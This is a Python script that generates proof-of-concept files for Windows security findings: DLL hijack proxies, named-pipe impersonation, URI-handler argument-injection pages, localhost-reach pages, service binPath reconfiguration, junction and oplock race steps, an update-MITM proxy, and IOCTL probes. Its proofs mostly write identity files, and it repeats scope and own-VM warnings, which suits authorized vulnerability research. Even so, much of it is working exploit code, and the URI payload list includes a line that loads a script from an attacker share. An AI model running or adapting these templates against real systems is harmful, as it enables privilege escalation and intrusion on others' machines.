#!/usr/bin/env python3
"""
poc_gen.py — generate a runnable proof for a specific finding class.

A PoC's job is to make a triager's reproduction take two minutes and leave no room for
"works as designed". Every template here proves the boundary crossing and nothing else:
it writes a file containing the token the code ran under. No payloads, no persistence,
no data touched.

Kinds:
  proxy-dll      DLL-hijack proof: forwards nothing, writes whoami+pid+image path, exits clean
  pipe-client    named-pipe client that connects as a standard user and records the result
  pipe-fuzz      structure-aware message prober for a discovered pipe protocol
  uri-arg        HTML page that drives a custom URI handler (argument injection)
  localhost      HTML page that reaches a 127.0.0.1 listener from a web origin (+DNS-rebind note)
  acl-check      standalone ACL prover for one path (C# so it can run without PowerShell policy)
  service-abuse  reconfiguration probe for a service whose DACL grants Users
  symlink        oplock/junction primitive skeleton for arbitrary-write-as-SYSTEM classes
  update-mitm    local proxy that shows whether the updater verifies TLS and signatures

Usage:
  poc_gen.py --kind proxy-dll --out loot/<x>/poc --dll wintls.dll --loader AcmeSvc.exe
  poc_gen.py --kind pipe-client --out ... --pipe AcmeSvcPipe
  poc_gen.py --kind uri-arg --out ... --scheme acme --payload "--gpu-launcher=calc"
  poc_gen.py --kind localhost --out ... --port 17632
  poc_gen.py --list
"""
import argparse, os, textwrap


def read_exports(path):
    """Export names from a PE, for building a forwarding proxy."""
    try:
        import pefile
        pe = pefile.PE(path)
        pe.parse_data_directories(
            directories=[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_EXPORT']])
        out = []
        for e in getattr(getattr(pe, 'DIRECTORY_ENTRY_EXPORT', None), 'symbols', []) or []:
            if e.name:
                out.append(e.name.decode('utf-8', 'replace'))
        pe.close()
        return out
    except Exception:
        return []

PROXY_DEF = """; {dll} — export forwarders so the host keeps working while the proof runs.
; Build (mingw):  x86_64-w64-mingw32-gcc -shared -o {dll} poc.c {dll}.def
; Build (MSVC):   cl /LD poc.c /link /DEF:{dll}.def
LIBRARY {dllbase}
EXPORTS
{forwards}
"""

PROXY_DLL = r'''/* {dll} — DLL search-order hijack PROOF for {loader}
 *
 * Proves only that this DLL was loaded, and under which token. It writes one text file and
 * returns. It does not forward exports (add them with a .def file if the host needs them to
 * keep running), does not spawn anything, and does not persist.
 *
 * {forward_note}
 *
 * Build (Linux, mingw):   x86_64-w64-mingw32-gcc -shared -o {dll} poc.c {deffile}
 * Build (Windows, MSVC):  cl /LD poc.c /Fe:{dll} advapi32.lib
 * Place in the directory the loader searches, start {loader}, read C:\Users\Public\wh_proof.txt
 */
#include <windows.h>
#include <stdio.h>

static void proof(void) {{
    char user[256] = {{0}}; DWORD n = sizeof(user);
    char image[MAX_PATH] = {{0}};
    GetUserNameA(user, &n);
    GetModuleFileNameA(NULL, image, MAX_PATH);
    HANDLE t = NULL; DWORD elev = 0, sz = sizeof(elev);
    TOKEN_ELEVATION te = {{0}};
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {{
        DWORD ret = 0;
        GetTokenInformation(t, TokenElevation, &te, sizeof(te), &ret);
        elev = te.TokenIsElevated;
        CloseHandle(t);
    }}
    FILE *f = fopen("C:\\Users\\Public\\wh_proof.txt", "a");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] {dll} loaded by pid=%lu image=%s user=%s elevated=%lu\n",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
            GetCurrentProcessId(), image, user, elev);
    fclose(f);
}}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {{
    if (reason == DLL_PROCESS_ATTACH) {{ DisableThreadLibraryCalls(h); proof(); }}
    return TRUE;
}}
'''

PIPE_CLIENT = r'''// pipe-client PoC — can a STANDARD USER open \\.\pipe\{pipe}, and what does the server accept?
//
// Build: csc /nologo /out:PipeProbe.exe PipeProbe.cs      (or: dotnet build)
// Run as the LOWEST-privileged account you can. That is the whole point: if this connects
// and the server runs as SYSTEM, the protocol behind it is a privilege boundary.
using System;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Text;

class PipeProbe {{
    static void Main(string[] args) {{
        string pipe = args.Length > 0 ? args[0] : "{pipe}";
        Console.WriteLine("[*] running as: " + WindowsIdentity.GetCurrent().Name);
        Console.WriteLine("[*] connecting to \\\\.\\pipe\\" + pipe);
        try {{
            using (var c = new NamedPipeClientStream(".", pipe, PipeDirection.InOut,
                                                     PipeOptions.None,
                                                     TokenImpersonationLevel.Anonymous)) {{
                c.Connect(3000);
                Console.WriteLine("[+] CONNECTED as a non-privileged caller");
                // Identify the server side. Never send anything destructive.
                string probe = args.Length > 1 ? args[1] : "{{\"method\":\"version\"}}";
                var b = Encoding.UTF8.GetBytes(probe);
                c.Write(b, 0, b.Length);
                c.Flush();
                var buf = new byte[8192];
                c.ReadTimeout = 3000;
                int n = c.Read(buf, 0, buf.Length);
                Console.WriteLine("[+] server replied {{0}} bytes:", n);
                Console.WriteLine(Encoding.UTF8.GetString(buf, 0, n));
                File.AppendAllText(@"C:\Users\Public\wh_pipe_proof.txt",
                    DateTime.Now + " connected to " + pipe + " as " +
                    WindowsIdentity.GetCurrent().Name + " reply=" +
                    Encoding.UTF8.GetString(buf, 0, Math.Max(n,0)) + Environment.NewLine);
            }}
        }} catch (Exception e) {{
            Console.WriteLine("[-] " + e.GetType().Name + ": " + e.Message);
        }}
    }}
}}
'''

URI_ARG = r'''<!doctype html>
<!-- URI-handler PoC for {scheme}://
     Serve this over http (python3 -m http.server) and open it in the VM's browser. The
     point is that a REMOTE web page reaches a LOCAL application: that is the boundary.
     Watch the target process's command line in Process Explorer / Procmon while it fires. -->
<meta charset="utf-8">
<title>{scheme}:// handler probe</title>
<style>body{{font:14px system-ui;margin:2rem;max-width:52rem}}code{{background:#eee;padding:2px 4px}}</style>
<h1>{scheme}:// argument-injection probe</h1>
<p>Each button navigates to a crafted <code>{scheme}://</code> URL. If the handler's
registry command is <code>"C:\...\app.exe" %1</code> (unquoted <code>%1</code>), the shell
splits on spaces and everything after the first token becomes additional
<strong>command-line arguments</strong> to a locally installed program.</p>
<ol id="cases"></ol>
<script>
const payloads = [
  ["baseline",            "{scheme}://test"],
  ["space split",         "{scheme}://x {payload}"],
  ["quote break",         "{scheme}://x\" {payload} \""],
  ["url-encoded space",   "{scheme}://x%20{payload}"],
  ["chromium gpu-launcher","{scheme}://x --gpu-launcher=\"cmd /c echo wh>C:\\\\Users\\\\Public\\\\wh_uri.txt\""],
  ["electron inspect",    "{scheme}://x --inspect-brk=0.0.0.0:9229"],
  ["node run-as-node",    "{scheme}://x --require=\\\\\\\\attacker\\\\share\\\\p.js"],
  ["path traversal",      "{scheme}://../../../../Windows/System32/calc.exe"],
];
const ol = document.getElementById('cases');
for (const [name, url] of payloads) {{
  const li = document.createElement('li');
  const b = document.createElement('button');
  b.textContent = name;
  b.onclick = () => {{ location.href = url; }};
  const c = document.createElement('code');
  c.textContent = ' ' + url;
  li.append(b, c); ol.append(li);
}}
</script>
<p><strong>Proof to capture:</strong> the target process's full command line (Process Explorer →
Properties → Image), plus <code>C:\Users\Public\wh_uri.txt</code> if a launcher flag landed.
A screenshot of calc.exe is not proof; the command line is.</p>
'''

LOCALHOST = r'''<!doctype html>
<!-- Localhost-listener PoC — port {port}
     A 127.0.0.1 service is reachable from ANY web page the user visits unless it checks
     Origin AND authenticates. Host this on a real origin (not file://) so the browser
     applies normal CORS rules; that is the realistic attacker position. -->
<meta charset="utf-8"><title>localhost:{port} reachability</title>
<style>body{{font:14px system-ui;margin:2rem;max-width:56rem}} pre{{background:#111;color:#0f0;padding:1rem;overflow:auto}}</style>
<h1>Reaching 127.0.0.1:{port} from a web origin</h1>
<pre id="out">running…</pre>
<script>
const out = document.getElementById('out');
const log = (...a) => out.textContent += '\n' + a.join(' ');
out.textContent = 'origin: ' + location.origin;

const paths = ['/', '/status', '/version', '/api', '/api/v1', '/health', '/rpc', '/json',
               '/config', '/debug', '/metrics'];

(async () => {{
  for (const p of paths) {{
    // no-cors still PROVES the request was delivered (check the server log); cors proves READ access
    try {{
      const r = await fetch('http://127.0.0.1:{port}' + p, {{mode:'cors', credentials:'include'}});
      log('[CORS-READABLE]', p, r.status, (await r.text()).slice(0,180));
    }} catch (e) {{
      try {{
        await fetch('http://127.0.0.1:{port}' + p, {{mode:'no-cors', credentials:'include'}});
        log('[DELIVERED, not readable]', p, '(no CORS header — still a CSRF-style write surface)');
      }} catch (e2) {{ log('[blocked]', p, e2.message); }}
    }}
  }}
  // WebSocket ignores same-origin policy entirely: no CORS, only an Origin header the
  // server has to check itself.
  try {{
    const ws = new WebSocket('ws://127.0.0.1:{port}/');
    ws.onopen  = () => log('[WS OPEN] the server accepted a cross-origin WebSocket — '
                         + 'if it does not validate the Origin header, any site owns this API');
    ws.onmessage = e => log('[WS MSG]', String(e.data).slice(0,200));
    ws.onerror = () => log('[WS] refused');
  }} catch (e) {{ log('[WS] ' + e.message); }}
}})();
</script>
<h2>If this reads data or triggers an action</h2>
<ol>
<li>Record the exact request/response pair.</li>
<li>Check whether the server validates <code>Origin</code> — retry with a spoofed-origin curl
    (a non-browser client) to see if the browser was the only thing stopping you.</li>
<li>If it only binds loopback and checks nothing, add the <strong>DNS rebinding</strong> case:
    a hostname that first resolves to your IP and then to 127.0.0.1 defeats an
    <code>Origin</code>-less <code>Host: localhost</code> check.</li>
<li>Escalate: does any endpoint take a path, a command, an update URL, or a token?</li>
</ol>
'''

ACL_CHECK = r'''// acl-check — does a NON-ADMIN principal have write access to {path}?
// Build: csc /nologo AclCheck.cs     Run: AclCheck.exe "{path}"
using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;

class AclCheck {{
    static void Main(string[] a) {{
        string p = a.Length > 0 ? a[0] : @"{path}";
        Console.WriteLine("target : " + p);
        Console.WriteLine("running: " + WindowsIdentity.GetCurrent().Name);
        try {{
            var ds = Directory.Exists(p)
                ? (FileSystemSecurity)new DirectoryInfo(p).GetAccessControl()
                : new FileInfo(p).GetAccessControl();
            Console.WriteLine("owner  : " + ds.GetOwner(typeof(NTAccount)));
            foreach (FileSystemAccessRule r in ds.GetAccessRules(true, true, typeof(NTAccount))) {{
                string id = r.IdentityReference.Value;
                bool low = id.EndsWith(@"\Users") || id.Contains("Authenticated Users")
                        || id == "Everyone" || id.Contains("INTERACTIVE");
                bool w = (r.FileSystemRights & (FileSystemRights.Write | FileSystemRights.Modify
                        | FileSystemRights.FullControl | FileSystemRights.CreateFiles
                        | FileSystemRights.WriteData | FileSystemRights.ChangePermissions
                        | FileSystemRights.TakeOwnership)) != 0;
                if (low && w && r.AccessControlType == AccessControlType.Allow)
                    Console.WriteLine("  *** USER-WRITABLE: " + id + " => " + r.FileSystemRights);
            }}
        }} catch (Exception e) {{ Console.WriteLine("acl read failed: " + e.Message); }}
        // ACLs can lie. Prove it.
        try {{
            string t = Path.Combine(Directory.Exists(p) ? p : Path.GetDirectoryName(p),
                                    "wh_" + Guid.NewGuid().ToString("N").Substring(0,8) + ".tmp");
            File.WriteAllText(t, "");
            File.Delete(t);
            Console.WriteLine("  *** REAL WRITE SUCCEEDED as " + WindowsIdentity.GetCurrent().Name);
        }} catch (Exception e) {{ Console.WriteLine("  real write failed: " + e.Message); }}
    }}
}}
'''

SERVICE_ABUSE = r'''# service-abuse probe — can a standard user reconfigure {service}?
# READ-ONLY by default. The write test is commented out: uncomment ONLY in your own VM and
# ONLY if scope/authorized_actions.txt grants `modify-acl`.
$svc = "{service}"
Write-Host "running as: $(whoami)"
$sd = (& sc.exe sdshow $svc) -join ' '
Write-Host "SDDL: $sd"
# Decode the ACEs that matter:
#   RP = start,  WP = stop,  DC = CHANGE CONFIG (this is the LPE),  WD/GA = full
#   ;;;BU = Builtin\Users   ;;;AU = Authenticated Users   ;;;IU = Interactive   ;;;WD = Everyone
if ($sd -match 'A;;[^)]*DC[^)]*;;;(BU|AU|IU|WD|S-1-5-32-545)') {{
  Write-Host "*** Users can CHANGE THE SERVICE CONFIG — set binPath and restart = SYSTEM" -ForegroundColor Red
}}
if ($sd -match 'A;;[^)]*(WD|GA)[^)]*;;;(BU|AU|IU|WD)') {{
  Write-Host "*** Users have WRITE_DAC/GENERIC_ALL on the service" -ForegroundColor Red
}}
Get-CimInstance Win32_Service -Filter "Name='$svc'" |
  Select-Object Name, StartName, PathName, StartMode, State | Format-List

# Proof step (ACTIVE — your own VM only):
# sc.exe config $svc binPath= "cmd /c echo %username% > C:\Users\Public\wh_svc.txt"
# sc.exe start  $svc
# ... then RESTORE the original binPath immediately.
'''

SYMLINK = r'''// symlink / junction primitive skeleton — arbitrary file write or delete AS SYSTEM
//
// Class: a privileged process writes/deletes a path under a directory the user controls
// (typically C:\ProgramData\<app>\... or %TEMP%). Redirect that path with an NTFS junction
// plus an object-manager symlink and the privileged write lands wherever you choose.
//
// This is a SKELETON, not a weapon: it sets up the redirection and records where the
// privileged write actually landed. It does not place a payload.
//
// The mature primitives live in James Forshaw's symboliclink-testing-tools
// (CreateMountPoint / CreateSymlink / SetOpLock / BaitAndSwitch). Use those in the VM; this
// file documents the exact sequence for the report so a triager can follow it.
//
//   1. Confirm the privileged write:      Procmon → Operation is CreateFile/WriteFile,
//                                          Result SUCCESS, Integrity System,
//                                          Path under the user-writable directory.
//   2. Empty the directory and replace it with a junction:
//        CreateMountPoint.exe C:\ProgramData\{app}\work \RPC Control
//   3. Add the object-manager symlink from the file name the service uses to your target:
//        CreateSymlink.exe \RPC Control\{file} \??\C:\Windows\System32\{target}
//   4. Trigger the privileged operation (service restart, update check, scheduled task).
//   5. Prove it: the target file now contains your content, written by SYSTEM.
//
// RACE variant: if the service writes then ACLs, or checks then opens (TOCTOU), hold an
// oplock on the first access (SetOpLock.exe) and swap the directory inside the window.
//
// Report what you measured: the exact Procmon line, the token of the writing process, and
// the resulting file with its new owner.
'''

UPDATE_MITM = r'''#!/usr/bin/env python3
"""update-mitm — does {product}'s updater verify TLS and the package signature?

Run this in YOUR OWN VM, with the VM's traffic pointed at it. It answers three questions:

  1. Does the client accept a self-signed/mismatched certificate?   (TLS validation)
  2. Does it accept a MODIFIED manifest (higher version, different URL)?  (manifest trust)
  3. Does it accept a package whose Authenticode signature is absent or invalid? (the real one)

Only 3 is usually a Critical. 1 and 2 are the road to it.

  python3 update_mitm.py --listen 8443 --upstream https://update.example.com --cert selfsigned.pem

Gate: the upstream host must be in scope/authorized_hosts.txt, and `mitm-update` must be
allowed in scope/authorized_actions.txt. Check both before running:
  scripts/scope_gate.sh host update.example.com && scripts/scope_gate.sh action mitm-update
"""
import argparse, http.server, ssl, urllib.request, re, sys

class H(http.server.BaseHTTPRequestHandler):
    upstream = None
    mutate = None

    def do_GET(self):
        url = self.upstream.rstrip('/') + self.path
        try:
            with urllib.request.urlopen(url, timeout=20) as r:
                body, ctype = r.read(), r.headers.get('Content-Type', 'application/octet-stream')
        except Exception as e:
            self.send_error(502, str(e)); return
        note = ''
        if self.mutate and re.search(r'(?i)\.(json|xml|txt|plist|yml)$|manifest|appcast|releases', self.path):
            new = re.sub(rb'(\d+)\.(\d+)\.(\d+)', lambda m: b'99.99.99', body, count=3)
            if new != body:
                body, note = new, ' [VERSION BUMPED]'
        sys.stderr.write(f'{self.command} {self.path} -> {len(body)}B{note}\n')
        self.send_response(200)
        self.send_header('Content-Type', ctype)
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass

if __name__ == '__main__':
    ap = argparse.ArgumentParser()
    ap.add_argument('--listen', type=int, default=8443)
    ap.add_argument('--upstream', required=True)
    ap.add_argument('--cert', help='PEM with cert+key; omit for plain HTTP')
    ap.add_argument('--mutate', action='store_true', help='bump versions in manifests')
    a = ap.parse_args()
    H.upstream, H.mutate = a.upstream, a.mutate
    srv = http.server.ThreadingHTTPServer(('0.0.0.0', a.listen), H)
    if a.cert:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(a.cert)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
    print(f'[*] proxying {a.upstream} on :{a.listen} ({"TLS" if a.cert else "plain"})')
    print('[*] point the VM at this host (hosts file or DNS) and trigger an update check')
    srv.serve_forever()
'''



IMPERSONATE_CS = r"""// impersonate.cs — receive a privileged connection on a pipe we own, then act as that client.
//
// This is the PoC for "a SYSTEM component can be made to connect to a pipe I control", and for
// the service-account case where the account already holds SeImpersonatePrivilege.
//
// Build:  csc /nologo /unsafe impersonate.cs
// Run:    impersonate.exe {pipe}      (then trigger the product feature that connects)
//
// It PROVES the boundary crossing and stops: it writes the impersonated identity to a file.
// It does not spawn a shell.
using System;
using System.IO;
using System.IO.Pipes;
using System.Security.Principal;
using System.Threading;

class Impersonate {{
    static void Main(string[] a) {{
        string pipe = a.Length > 0 ? a[0] : "{pipe}";
        Console.WriteLine("[*] listening as: " + WindowsIdentity.GetCurrent().Name);
        Console.WriteLine("[*] whoami /priv -> confirm SeImpersonatePrivilege is present");
        Console.WriteLine("[*] creating \\\\.\\pipe\\" + pipe + " with a permissive DACL");

        var sec = new PipeSecurity();
        sec.AddAccessRule(new PipeAccessRule(
            new SecurityIdentifier(WellKnownSidType.WorldSid, null),
            PipeAccessRights.FullControl, System.Security.AccessControl.AccessControlType.Allow));

        using (var srv = NamedPipeServerStream.Create(
                   pipe, PipeDirection.InOut, 1, PipeTransmissionMode.Byte,
                   PipeOptions.None, 4096, 4096, sec)) {{
            Console.WriteLine("[*] waiting for a client. Trigger the product feature now.");
            srv.WaitForConnection();
            srv.RunAsClient(() => {{
                var id = WindowsIdentity.GetCurrent();
                string line = DateTime.Now + "  impersonating: " + id.Name +
                              "  isSystem=" + id.IsSystem + "  token=" + id.Token;
                Console.WriteLine("[+] " + line);
                File.AppendAllText(@"C:\Users\Public\wh_impersonate_proof.txt", line + Environment.NewLine);
            }});
            srv.Disconnect();
        }}
        Console.WriteLine("[*] done — proof in C:\\Users\\Public\\wh_impersonate_proof.txt");
    }}
}}
"""

COM_ELEV_PS = r"""# com_elevation.ps1 — activate a COM class and enumerate what it will do for you.
# Target CLSID: {clsid}
#
# Run this as a STANDARD USER. The two questions are: does activation succeed, and does any
# method act on a path / command / URL you supply.

$clsid = "{clsid}"
Write-Host "running as: $(whoami)"

# --- 1. plain activation (the class's own ACL decides) ---------------------------------
try {{
  $t = [Type]::GetTypeFromCLSID([Guid]$clsid)
  $o = [Activator]::CreateInstance($t)
  Write-Host "[+] plain activation SUCCEEDED as a standard user" -ForegroundColor Green
  $o | Get-Member -MemberType Method | Format-Table Name, Definition -AutoSize
}} catch {{ Write-Host "[-] plain activation failed: $($_.Exception.Message)" }}

# --- 2. elevation moniker (only meaningful if Elevation\Enabled=1) ----------------------
# NOTE: same-user UAC bypass is NOT a security boundary (MSRC). This matters when the caller
# is a DIFFERENT user or a constrained service account.
$code = @'
using System;
using System.Runtime.InteropServices;
public static class Elev {{
  [DllImport("ole32.dll")] static extern int CoGetObject(string name, IntPtr bind, ref Guid iid, out IntPtr ppv);
  public static IntPtr Get(string moniker, Guid iid) {{
    IntPtr p; int hr = CoGetObject(moniker, IntPtr.Zero, ref iid, out p);
    if (hr != 0) Marshal.ThrowExceptionForHR(hr);
    return p;
  }}
}}
'@
Add-Type -TypeDefinition $code -ErrorAction SilentlyContinue
$iid = [Guid]"00000000-0000-0000-C000-000000000046"   # IUnknown
try {{
  $p = [Elev]::Get("Elevation:Administrator!new:$clsid", $iid)
  Write-Host "[+] elevation moniker activation SUCCEEDED (ptr $p)" -ForegroundColor Yellow
}} catch {{ Write-Host "[-] elevation moniker: $($_.Exception.Message)" }}

# --- 3. server path and identity --------------------------------------------------------
Get-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\$clsid\InprocServer32",
                 "HKLM:\SOFTWARE\Classes\CLSID\$clsid\LocalServer32" -EA 0 |
  Select-Object PSPath, '(default)', ThreadingModel
$appid = (Get-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\$clsid" -EA 0).AppID
if ($appid) {{ Get-ItemProperty "HKLM:\SOFTWARE\Classes\AppID\$appid" -EA 0 | Format-List }}
"""

IOCTL_CS = r"""// ioctl_probe.cs — open a driver device as a standard user and walk its IOCTL surface.
//
// DO NOT RUN THIS WITHOUT A KERNEL DEBUGGER ATTACHED. A bugcheck with no debugger is a lost
// bug, and an unattended host will just reboot.
//
// Build: csc /nologo /unsafe ioctl_probe.cs
// Run:   ioctl_probe.exe \\.\{device} [codes.txt]
using System;
using System.IO;
using System.Runtime.InteropServices;

class IoctlProbe {{
    const uint GENERIC_READ = 0x80000000, GENERIC_WRITE = 0x40000000, OPEN_EXISTING = 3;
    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFile(string name, uint access, uint share, IntPtr sa,
                                    uint disp, uint flags, IntPtr tmpl);
    [DllImport("kernel32", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr h, uint code, byte[] inBuf, int inLen,
                                       byte[] outBuf, int outLen, out int ret, IntPtr ov);

    static void Main(string[] a) {{
        string dev = a.Length > 0 ? a[0] : @"\\.\{device}";
        Console.WriteLine("running as: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name);
        IntPtr h = CreateFile(dev, GENERIC_READ | GENERIC_WRITE, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
        if (h == (IntPtr)(-1)) {{
            Console.WriteLine("[-] CreateFile failed: " + Marshal.GetLastWin32Error()
                              + "  (5 = access denied -> the device has a real DACL)");
            return;
        }}
        Console.WriteLine("[+] DEVICE OPENED BY A STANDARD USER — the IOCTL surface is reachable");

        uint[] codes;
        if (a.Length > 1 && File.Exists(a[1])) {{
            var lines = File.ReadAllLines(a[1]);
            codes = Array.ConvertAll(lines, l => Convert.ToUInt32(l.Trim(), 16));
        }} else {{
            codes = new uint[] {{ {codes} }};
        }}
        var inBuf = new byte[0x40];
        var outBuf = new byte[0x40];
        foreach (var c in codes) {{
            int ret;
            bool ok = DeviceIoControl(h, c, inBuf, inBuf.Length, outBuf, outBuf.Length, out ret, IntPtr.Zero);
            int err = Marshal.GetLastWin32Error();
            // 1 = ERROR_INVALID_FUNCTION (no such handler), 87 = INVALID_PARAMETER (handler EXISTS
            // and validated), 122 = INSUFFICIENT_BUFFER (handler exists, wants more)
            string note = ok ? "SUCCESS" : (err == 1 ? "no handler" : "HANDLER PRESENT (err " + err + ")");
            Console.WriteLine($"  0x{{c:X8}}  {{note}}  ret={{ret}}");
        }}
    }}
}}
"""

RPC_CLIENT_PS = r"""# rpc_client.ps1 — bind to the interface and enumerate its procedures, as a standard user.
# Interface: {clsid}
#
# Needs NtObjectManager:  Install-Module NtObjectManager -Scope CurrentUser
# (James Forshaw's toolkit — it parses the same RPC_SERVER_INTERFACE structures rpc_audit.py
#  recovered statically, and it can generate a working client from them.)

Import-Module NtObjectManager
Write-Host "running as: $(whoami)"

$binary = "{target_path}"
$servers = Get-RpcServer $binary
$servers | Format-Table InterfaceId, InterfaceVersion, ProcedureCount, Name -AutoSize

$iface = $servers | Where-Object {{ $_.InterfaceId -eq "{clsid}" }}
if (-not $iface) {{ $iface = $servers | Select-Object -First 1 }}
if (-not $iface) {{ Write-Host "no server interface found in $binary"; exit }}

# Where is it reachable from?
Get-RpcEndpoint -InterfaceId $iface.InterfaceId -EA 0 | Format-Table Endpoint, Protocol -AutoSize
Get-RpcEndpoint -SearchType ALPC -EA 0 | Where-Object InterfaceId -eq $iface.InterfaceId |
  Format-Table Endpoint -AutoSize

# Every procedure, with its arguments — read these for a path / command / config parameter.
$iface.Procedures | ForEach-Object {{
  "{{0,3}}  {{1}}({{2}})" -f $_.ProcNum, $_.Name,
    (($_.Params | ForEach-Object {{ "$($_.Type) $($_.Name)" }}) -join ', ')
}}

# Bind as a standard user. If this succeeds, every procedure above is reachable.
$client = Get-RpcClient $iface
try {{
  Connect-RpcClient $client -EA Stop
  Write-Host "[+] BOUND as $(whoami) — the interface is callable by a standard user" -ForegroundColor Green
  $client | Get-Member -MemberType Method | Format-Table Name -AutoSize
}} catch {{ Write-Host "[-] bind failed: $($_.Exception.Message)" }}
"""

OPLOCK_PS = r"""# oplock_race.ps1 — win a check-then-use / create-then-ACL window.
#
# The technique: take an opportunistic lock on the file the privileged process reads FIRST.
# The oplock suspends that process inside the operation, giving you unlimited time to swap the
# path (junction + object-manager symlink) before it continues.
#
# Requires: symboliclink-testing-tools (Forshaw) — SetOpLock.exe, CreateMountPoint.exe,
#           CreateSymlink.exe, BaitAndSwitch.exe
#
# Target: {path}

$target = "{path}"
$bait   = "$env:TEMP\wh_bait"
$dest   = "C:\Windows\System32\wh_proof.txt"     # where the privileged write should LAND

Write-Host "1. Confirm the privileged operation in Procmon first:"
Write-Host "     Operation is CreateFile / WriteFile, Result SUCCESS, Integrity System"
Write-Host "     Path is under a directory you can write"
Write-Host ""
Write-Host "2. Hold an oplock on the first-touched file:"
Write-Host "     SetOpLock.exe `"$target`" x"
Write-Host ""
Write-Host "3. With the process suspended, swap the directory for a junction:"
Write-Host "     CreateMountPoint.exe `"$(Split-Path $target)`" \RPC Control"
Write-Host "     CreateSymlink.exe `"\RPC Control\$(Split-Path $target -Leaf)`" `"\??\$dest`""
Write-Host ""
Write-Host "4. Release the oplock and let it continue. Then:"
Write-Host "     Get-Item `"$dest`" | Select-Object FullName, Length"
Write-Host "     (Get-Acl `"$dest`").Owner      # should be SYSTEM"
Write-Host ""
Write-Host "BaitAndSwitch.exe automates 2-4 for the common shapes."
"""

KINDS = {
    'proxy-dll': ('poc.c', PROXY_DLL, ['dll', 'loader']),
    'pipe-client': ('PipeProbe.cs', PIPE_CLIENT, ['pipe']),
    'uri-arg': ('uri_probe.html', URI_ARG, ['scheme', 'payload']),
    'localhost': ('localhost_probe.html', LOCALHOST, ['port']),
    'acl-check': ('AclCheck.cs', ACL_CHECK, ['path']),
    'service-abuse': ('service_probe.ps1', SERVICE_ABUSE, ['service']),
    'symlink': ('SYMLINK_PRIMITIVE.md', SYMLINK, ['app', 'file', 'target']),
    'update-mitm': ('update_mitm.py', UPDATE_MITM, ['product']),
    'impersonate': ('impersonate.cs', IMPERSONATE_CS, ['pipe']),
    'com-elevation': ('com_elevation.ps1', COM_ELEV_PS, ['clsid']),
    'ioctl-probe': ('ioctl_probe.cs', IOCTL_CS, ['device', 'codes']),
    'rpc-client': ('rpc_client.ps1', RPC_CLIENT_PS, ['clsid', 'product']),
    'oplock-race': ('oplock_race.ps1', OPLOCK_PS, ['path']),
}
DEFAULTS = {'dll': 'target.dll', 'loader': 'target.exe', 'pipe': 'TargetPipe',
            'scheme': 'targetapp', 'payload': '--flag=value', 'port': '8080',
            'path': r'C:\ProgramData\Target', 'service': 'TargetSvc', 'app': 'Target',
            'file': 'config.dat', 'target': 'wh_proof.txt', 'product': 'Target',
            'clsid': '{00000000-0000-0000-0000-000000000000}', 'device': 'TargetDevice',
            'codes': '0x22E000, 0x22E004, 0x22E008',
            'target_path': r'C:\Program Files\Target\target.exe',
            'dllbase': 'target', 'forwards': '    ; (no forwarders — pass --forward <real.dll>)',
            'forward_note': 'No export forwarding: the host may fail after loading this. Pass '
                            '--forward <real.dll> to generate a forwarding .def.',
            'deffile': ''}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--kind', choices=sorted(KINDS))
    ap.add_argument('--out', default='.')
    ap.add_argument('--list', action='store_true')
    ap.add_argument('--forward', default=None,
                    help='path to the REAL dll whose exports the proxy should forward')
    for k in DEFAULTS:
        ap.add_argument(f'--{k}', default=None)
    a = ap.parse_args()
    if a.list or not a.kind:
        for k, (fn, _, req) in sorted(KINDS.items()):
            print(f'{k:14} -> {fn:22} needs: {", ".join("--" + r for r in req)}')
        return
    fn, tmpl, req = KINDS[a.kind]
    vals = {k: (getattr(a, k) or DEFAULTS[k]) for k in DEFAULTS}
    os.makedirs(a.out, exist_ok=True)

    # A stub proxy DLL that resolves no exports frequently breaks the host process, which both
    # loses the proof and looks like a crash bug. Forward every export to the real library.
    deffile = None
    if a.kind == 'proxy-dll' and a.forward:
        exports = read_exports(a.forward)
        if exports:
            # forward to "<thisdll>_orig", not to the source file's name: the operator renames
            # the victim DLL to that beside the proxy, which keeps the host working
            vals['dllbase'] = os.path.splitext(vals['dll'])[0]
            real = vals['dllbase']
            vals['forwards'] = '\n'.join(f'    {e}={real}_orig.{e} @{i+1}'
                                          for i, e in enumerate(exports[:2000]))
            vals['forward_note'] = (f'Forwards {len(exports)} export(s) to {real}_orig.dll — rename '
                                    f'the original alongside this DLL so the host keeps working.')
            vals['deffile'] = vals['dll'] + '.def'
            deffile = os.path.join(a.out, vals['dll'] + '.def')
        else:
            print(f'[poc_gen] could not read exports from {a.forward} — emitting a stub proxy')
    p = os.path.join(a.out, fn)
    open(p, 'w', encoding='utf-8').write(tmpl.format(**vals))
    print(f'[poc_gen] {a.kind} -> {p}')
    if deffile:
        open(deffile, 'w', encoding='utf-8').write(PROXY_DEF.format(**vals))
        print(f'[poc_gen] forwarding module-definition file -> {deffile}')
        print(f"[poc_gen] build: x86_64-w64-mingw32-gcc -shared -o {vals['dll']} "
              f"{os.path.basename(p)} {os.path.basename(deffile)}")
    missing = [r for r in req if not getattr(a, r)]
    if missing:
        print(f'[poc_gen] using defaults for: {", ".join(missing)} — pass them for a real PoC')
    print('[poc_gen] REMINDER: run it only in your own VM, and only if '
          'scope/authorized_actions.txt allows the action.')


if __name__ == '__main__':
    main()
